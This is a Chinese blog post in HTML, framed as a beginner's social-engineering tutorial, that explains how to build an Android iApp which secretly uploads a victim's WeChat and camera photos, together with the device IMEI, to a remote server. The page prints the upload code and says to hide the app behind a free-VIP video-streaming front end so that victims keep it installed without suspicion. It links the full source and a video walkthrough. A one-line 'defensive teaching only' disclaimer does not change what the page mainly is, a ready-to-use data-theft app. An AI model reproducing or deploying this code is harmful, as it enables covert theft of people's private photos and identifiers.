@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="renderer" content="webkit">
+
+  
+  <title>0基础实现一次iapp模拟黑客攻防-社会工程学攻击 | 小锌翼翼</title>
+
+  <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+  <meta name="keywords" content="">
+  <meta name="format-detection" content="telephone=no,email=no">
+  <meta name="theme-color" content="#9C27B0">
+
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="application-name" content="小锌翼翼">
+  <meta name="msapplication-starturl" content="https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/">
+  <meta name="msapplication-navbutton-color" content="#9C27B0">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="小锌翼翼">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <link rel="apple-touch-icon" href="/images/favicon.ico">
+
+  
+    <link rel="canonical" href="https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/">
+  
+
+  
+<link rel="stylesheet" href="/css/mdui.css">
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/custom.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body class="mdui-appbar-with-toolbar mdui-theme-primary-indigo mdui-theme-accent-pink">
+  <script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
+  <script>if(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
+  <script>var a=localStorage.getItem("mdui-drawer-close");if(!a){document.getElementsByTagName("body")[0].className+=" mdui-drawer-body-left"};</script>
+  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
+  <div class="mdui-toolbar mdui-color-theme">
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
+    <a href="/" class="mdui-typo-headline">小锌翼翼</a>
+    <div class="mdui-toolbar-spacer"></div>
+    <!-- <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: '搜索'}"><i class="mdui-icon material-icons">search</i></a> -->
+    
+  </div>
+</header>
+<div class="mdui-dialog" id="search">
+  
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="请输入关键字"><input type="hidden" name="sitesearch" value="https://i.1ove.icu"></form>
+    <div class="search-result"></div>
+  
+</div>
+  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
+  <script>var a=localStorage.getItem("mdui-drawer-close");if(a){document.getElementById("sidebar").className+=" mdui-drawer-close"};</script>
+  <div class="mdui-grid-tile">
+    <img src="/images/banner.png" style="height: 160px;">
+    <img src="/images/banznx.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
+    <div class="mdui-grid-tile-actions">
+      <div class="mdui-grid-tile-text">
+        <div class="mdui-grid-tile-title">Zn</div>
+        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i>✨GoodLuck To You</div>
+      </div>
+      
+        <div class="mdui-grid-tile-buttons">
+          <a href="mailto:banznx@qq.com" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'banznx@qq.com'}"><i class="mdui-icon material-icons">email</i></a>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="mdui-list" mdui-collapse="{accordion: true}">
+    <a href="/" class="mdui-list-item mdui-ripple">
+      <i class="mdui-list-item-icon mdui-icon material-icons">home</i>
+      <div class="mdui-list-item-content">主页</div>
+    </a>
+    <div class="mdui-collapse-item">
+      <script>var a=localStorage.getItem("mdui-collapse-item-0");if(a){document.getElementsByClassName("mdui-collapse-item")[0].className+=" mdui-collapse-item-open"};</script>
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons">archive</i>
+        <div class="mdui-list-item-content">归档</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+        <a class="mdui-ripple sidebar_archives-link" href="/archives/2021/12/">十二月 2021<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2021/11/">十一月 2021<span class="mdui-ripple sidebar_archives-count">2</span></a>
+        
+      </div>
+    </div>
+    <div class="mdui-collapse-item">
+      <script>var a=localStorage.getItem("mdui-collapse-item-1");if(a){document.getElementsByClassName("mdui-collapse-item")[1].className+=" mdui-collapse-item-open"};</script>
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons">class</i>
+        <div class="mdui-list-item-content">分类</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+        
+        
+          <a href="javascript:;" class="mdui-list-item mdui-p-l-2 mdui-text-color-theme mdui-ripple" style="justify-content: center;">分类为空</a>
+        
+      </div>
+    </div>
+    <div class="mdui-collapse-item">
+      <script>var a=localStorage.getItem("mdui-collapse-item-2");if(a){document.getElementsByClassName("mdui-collapse-item")[2].className+=" mdui-collapse-item-open"};</script>
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons">bookmark</i>
+        <div class="mdui-list-item-content">标签</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+        
+        
+          <a href="javascript:;" class="mdui-list-item mdui-p-l-2 mdui-text-color-theme mdui-ripple" style="justify-content: center;">标签为空</a>
+        
+      </div>
+    </div>
+    <a href="/about" class="mdui-list-item mdui-ripple">
+      <i class="mdui-list-item-icon mdui-icon material-icons">person</i>
+      <div class="mdui-list-item-content">关于</div>
+    </a>
+  </div>
+
+  <div class="mdui-divider"></div>
+
+  <div class="mdui-list" mdui-collapse="{accordion: true}">
+    
+      <a target="_blank" rel="noopener" href="//api.1ove.icu" class="mdui-list-item mdui-ripple">🧬叮当API</a>
+    
+      <a target="_blank" rel="noopener" href="//v.1ove.icu" class="mdui-list-item mdui-ripple">🎨叮当推荐</a>
+    
+    <div class="mdui-collapse-item">
+      <script>var a=localStorage.getItem("mdui-collapse-item-3");if(a){document.getElementsByClassName("mdui-collapse-item")[3].className+=" mdui-collapse-item-open"};</script>
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <div class="mdui-list-item-content">友情链接</div>
+        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+          <a href="//1ove.icu" target="_blank" class="mdui-list-item mdui-p-l-2 mdui-text-color-theme-accent mdui-ripple" style="justify-content: center;">❤️叮当网络</a>
+        
+          <a href="//github.com/zxwljs" target="_blank" class="mdui-list-item mdui-p-l-2 mdui-text-color-theme-accent mdui-ripple" style="justify-content: center;">🌌Github</a>
+        
+          <a href="https://console.cloud.tencent.com/" target="_blank" class="mdui-list-item mdui-p-l-2 mdui-text-color-theme-accent mdui-ripple" style="justify-content: center;">🗃️Console</a>
+        
+        
+      </div>
+    </div>
+  </div>
+</aside>
+  <main id="main" class="mdui-m-t-5 fadeIn animated">
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
+  <article class="mdui-card mdui-m-b-5">
+    <header class="mdui-card-media">
+      <img src="/images/random/material-13.png" style="max-height: 240px;">
+      <div class="mdui-card-media-covered">
+        <div class="mdui-card-primary">
+          <div class="mdui-card-primary-title">0基础实现一次iapp模拟黑客攻防-社会工程学攻击</div>
+          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2021-12-28 / <i class="iconfont">&#xe601;</i> Zn</div>
+        </div>
+      </div>
+      <div class="mdui-card-menu">
+        
+          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
+          <ul class="mdui-menu" id="qrcode">
+            
+            <li class="mdui-menu-item" disabled>
+                <img src="https://api.pwmqr.com/qrcode/create/?url=https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/}">
+				<center><text>手机查看</text></center>
+            </li>
+          </ul>
+        
+        
+          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
+          <ul class="mdui-menu" id="share_menu">
+            <li class="mdui-menu-item">
+              <a href="http://service.weibo.com/share/share.php?appkey=&title=0基础实现一次iapp模拟黑客攻防-社会工程学攻击&url=https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/&pic=https://i.1ove.icu/images/favicon.ico&searchPic=false&style=simple" target="_blank" class="mdui-ripple">分享到 Weibo</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://twitter.com/intent/tweet?text=0基础实现一次iapp模拟黑客攻防-社会工程学攻击&url=https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/&via=Zn" target="_blank" class="mdui-ripple">分享到 Twitter</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://www.facebook.com/sharer/sharer.php?u=https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/" target="_blank" class="mdui-ripple">分享到 Facebook</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="http://connect.qq.com/widget/shareqq/index.html?site=小锌翼翼&title=0基础实现一次iapp模拟黑客攻防-社会工程学攻击&pics=https://i.1ove.icu/images/favicon.ico&url=https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/" target="_blank" class="mdui-ripple">分享到 QQ</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://telegram.me/share/url?url=https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/&text=0基础实现一次iapp模拟黑客攻防-社会工程学攻击" target="_blank" class="mdui-ripple">分享到 Telegram</a>
+            </li>
+          </ul>
+        
+      </div>
+    </header>
+    <div class="mdui-card-content mdui-typo">
+      <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文仅用于信息防御技术教学 请勿用于其他用途</p>
+<h3 id="1-什么是社会工程学"><a href="#1-什么是社会工程学" class="headerlink" title="1.什么是社会工程学"></a>1.什么是社会工程学</h3><h4 id="百度百科定义"><a href="#百度百科定义" class="headerlink" title="百度百科定义"></a>百度百科定义</h4><p>社会工程学（Social Engineering，又被翻译为：社交工程学）在上世纪60年代左右作为正式的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%A6%E7%A7%91/2634099">学科</a>出现，广义<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6">社会工程学</a>的定义是：建立理论并通过利用自然的、社会的和制度上的途径来逐步地解决各种复杂的社会问题，经过多年的应用发展，社会工程学逐渐产生出了分支学科，如<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%AC%E5%AE%89%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6">公安社会工程学</a>（简称<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%AC%E5%AE%89%E7%A4%BE%E5%B7%A5%E5%AD%A6">公安社工学</a>）和网络社会工程学。</p>
+<h4 id="安全学院解释"><a href="#安全学院解释" class="headerlink" title="安全学院解释"></a>安全学院解释</h4><p>社会工程学是利用者的一个灵活性，对对方漏洞进行分析，分析以后加以总结。</p>
+<h3 id="2-实例所用到的方法"><a href="#2-实例所用到的方法" class="headerlink" title="2.实例所用到的方法"></a>2.实例所用到的方法</h3><p>这个实例使用的是对被攻击者的安卓系统的权限漏洞所进行的信息收集。</p>
+<h2 id="二、环境部署"><a href="#二、环境部署" class="headerlink" title="二、环境部署"></a>二、环境部署</h2><p>系统环境：安卓系统Android</p>
+<p>软件环境：iapp</p>
+<h3 id="1-下载iapp"><a href="#1-下载iapp" class="headerlink" title="1.下载iapp"></a>1.下载iapp</h3><p>各大应用商店即可下载</p>
+<p><a target="_blank" rel="noopener" href="https://app.mi.com/details?id=com.iapp.app&amp;ref=search%EF%BC%88%E5%B0%8F%E7%B1%B3%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E5%9C%B0%E5%9D%80%EF%BC%89">https://app.mi.com/details?id=com.iapp.app&amp;ref=search（小米应用商店地址）</a></p>
+<h2 id="三、实例代码"><a href="#三、实例代码" class="headerlink" title="三、实例代码"></a>三、实例代码</h2><h3 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h3><p>这个代码的逻辑是使用受攻击者对软件权限的信任，从而实现上传用户手机的相册到服务器。</p>
+<p>因为上传相册需要大量的宽带（就是流量），所以客户端前端套用追剧软件，以免受攻击者产生疑虑。</p>
+<h3 id="2-iapp代码"><a href="#2-iapp代码" class="headerlink" title="2.iapp代码"></a>2.iapp代码</h3><p>本实例使用<strong>叮当数据</strong>的相册备份服务，该服务是为用户提供备份相册而开发的，我们可以使用该服务，实现直接上传受攻击者的相册到开发者后台。</p>
+<h4 id="1）注册叮当数据"><a href="#1）注册叮当数据" class="headerlink" title="1）注册叮当数据"></a>1）注册叮当数据</h4><p>打开微信小程序【API叮当数据】点击开始使用然后注册一个账号</p>
+<p><img src="https://i.loli.net/2021/11/19/52FQKq9zZ3swSA4.jpg" alt="img"></p>
+<p><strong>记录下用户名</strong></p>
+<p><img src="https://i.loli.net/2021/11/19/gMbzEFIV5jQYwRv.jpg" alt="img"></p>
+<h4 id="2）sdk代码"><a href="#2）sdk代码" class="headerlink" title="2）sdk代码"></a>2）sdk代码</h4><p>文档地址：<a target="_blank" rel="noopener" href="https://api.1ove.icu/iApp/dcim">https://api.1ove.icu/iApp/dcim</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">s path = <span class="string">&quot;/storage/emulated/0/Pictures/WeiXin/&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个是微信保存图片的路径</span></span><br><span class="line">  <span class="comment">//必须以&quot;/storage/emulated/0/&quot;开头 &quot;/&quot;结尾</span></span><br><span class="line">  <span class="comment">// &quot;/storage/emulated/0/DCIM/Camera&quot;是安卓相机的默认储存目录</span></span><br><span class="line"></span><br><span class="line">  fl(path, files)</span><br><span class="line">  <span class="comment">// path 路径 files 路径下所有的文件</span></span><br><span class="line">  <span class="keyword">for</span>(filename; files)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//filename 文件名</span></span><br><span class="line">    syso(<span class="string">&quot;️开始️&quot;</span>)</span><br><span class="line">    syso(filename)</span><br><span class="line">    ss(path+filename,filepath)</span><br><span class="line">    <span class="comment">//filepath 文件路径</span></span><br><span class="line">    fs(filepath, size)</span><br><span class="line">    s2(size/<span class="number">1024</span>/<span class="number">1024</span>, mb)</span><br><span class="line">    <span class="comment">//mb 图片大小</span></span><br><span class="line">    f(mb &gt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      syso(mb)</span><br><span class="line">      syso(<span class="string">&quot;文件过大&quot;</span>)</span><br><span class="line">      syso(<span class="string">&quot;️结束&quot;</span>)</span><br><span class="line">      syso(<span class="string">&quot;----------------------&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      syso(<span class="string">&quot;开始上传&quot;</span>)</span><br><span class="line">      <span class="comment">//API列表</span></span><br><span class="line">      s api = <span class="string">&quot;http://httpbin.org/post&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//00000000000000000000000设置参数</span></span><br><span class="line">      <span class="comment">// 用户特殊标识 一般用imei</span></span><br><span class="line">      simei(imei)</span><br><span class="line">      <span class="comment">//自定义参数 s imei = &quot;my code&quot;</span></span><br><span class="line">      <span class="comment">//设置你的 叮当数据 用户名 用于后台查看用户上传的文件</span></span><br><span class="line">      s user = <span class="string">&quot;admin@qq.com&quot;</span></span><br><span class="line">      <span class="comment">//0000000000000000000000</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//变量相加</span></span><br><span class="line">      ss(<span class="string">&quot;user=&quot;</span>+user+<span class="string">&quot;&amp;filename=&quot;</span>+filename+<span class="string">&quot;&amp;id=&quot;</span>+imei,data)</span><br><span class="line">      <span class="comment">//校检数据</span></span><br><span class="line">      huf(api, data , filepath,<span class="string">&quot;utf-8&quot;</span>, e)</span><br><span class="line">      <span class="comment">//上传数据 e为httpbin的返回结果</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3）修改sdk中的用户名"><a href="#3）修改sdk中的用户名" class="headerlink" title="3）修改sdk中的用户名"></a>3）修改sdk中的用户名</h4><p>在叮当数据里面获取<strong>用户名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s user = &quot;这里写你的用户名&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/19/gMbzEFIV5jQYwRv.jpg" alt="img"></p>
+<h4 id="4-把代码放置在载入事件"><a href="#4-把代码放置在载入事件" class="headerlink" title="4) 把代码放置在载入事件"></a>4) 把代码放置在载入事件</h4><p>本教程前端套用免vip追剧源码</p>
+<p>这个可以自己修改，我写了一个webview，直接浏览器访问VIP影视网站，因为这个可以使得受攻击者长时间保留应用</p>
+<h3 id="3-源码"><a href="#3-源码" class="headerlink" title="3.源码"></a>3.源码</h3><p><a target="_blank" rel="noopener" href="https://gitee.com/zxwljs/code-base/blob/master/iApp/com.fan.iapp.iApp">https://gitee.com/zxwljs/code-base/blob/master/iApp/com.fan.iapp.iApp</a></p>
+<p>下载后导入iapp软件即可</p>
+<h3 id="4-视频教程"><a href="#4-视频教程" class="headerlink" title="4.视频教程"></a>4.视频教程</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1PL411L7m9/">https://www.bilibili.com/video/BV1PL411L7m9/</a></p>
+
+      
+      <blockquote>
+        
+          <strong><a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" href="_blank"> CC BY-NC-SA 4.0 </a></strong><br>
+        
+        <strong>本文链接：</strong><br><a href="https://i.1ove.icu/0%E5%9F%BA%E7%A1%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1iapp%E6%A8%A1%E6%8B%9F%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/">https://i.1ove.icu/0基础实现一次iapp模拟黑客攻防-社会工程学攻击/</a>
+      </blockquote>
+    </div>
+    <footer class="mdui-card-actions">
+      
+      
+    </footer>
+    
+  </article>
+  
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>
+
+
+  <nav id="paginator">
+    
+    <div class="spacer"></div>
+    
+      <a rel="next" class="extend next" href="/iapp%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%88%B0%E4%BA%91%E5%87%BD%E6%95%B0/">
+        <span class="mdui-p-x-3" mdui-tooltip="{content: 'iapp上传图片到云函数'}">下一篇</span>
+        <button aria-label="next" class="mdui-btn mdui-btn-raised mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_forward</i></button>
+      </a>
+    
+  </nav>
+
+
+
+</main>
+  <div class="mdui-m-t-5 mdui-p-y-1 mdui-color-theme">
+	<div class="mdui-p-y-0 mdui-text-center">
+	  
+	  
+	  
+	    <small><a href="/images/banznx.jpg" target="_blank" class="mdui-btn mdui-btn-icon "><i class="mdui-icon iconfont">&#xe6e1;</i></a></small>
+	  
+		  <div id="jinrishici-sentence" class="mdui-typo-caption mdui-m-t-1">正在加载....</div><br>
+		  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+	</div>
+</div>
+<footer id="footer" class=" mdui-color-theme">
+  <div class="mdui-p-y-1 mdui-text-center mdui-typo mdui-text-color-grey-300">
+    <a target="_blank" rel="noopener" href="//1ove.icu" href="_blank">叮当网络</a>❤️2021 - 2021 <br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> Theme by <a href="https://github.com/niemingzhao/niemingzhao.github.io/tree/theme" target="_blank">default</a><br>
+	
+    
+	<br>
+  </div>
+</footer>
+<script>
+// 百度推送
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_upward</i></button>
+  
+  
+<script src="/js/mdui.js"></script>
+<script src="/js/script.js"></script>
+
+  
+<script src="/custom.js"></script>
+
+</body>
+</html>
